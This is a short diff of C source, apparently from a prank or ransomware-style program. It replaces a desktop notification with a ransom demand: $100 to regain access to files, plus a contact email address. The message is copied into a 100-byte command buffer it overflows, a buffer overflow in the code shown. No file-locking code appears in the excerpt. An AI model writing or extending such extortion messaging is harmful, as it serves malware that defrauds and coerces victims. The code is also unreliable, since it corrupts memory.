@@ -18,7 +18,7 @@ int main(int argc, char *argv[]) {
 	char command[100], msg[1000];
 
 	strcpy(command,"notify-send ");
-	strcpy(msg,"\"You have been GOATED.\"");
+	strcpy(msg,"\"You have been GOATED. To regain access to you files, you owe $100.00. Email ihavebeengoated@gmail.com for next steps.\"");
 	strcat(command,msg);
 
 	// Send system message
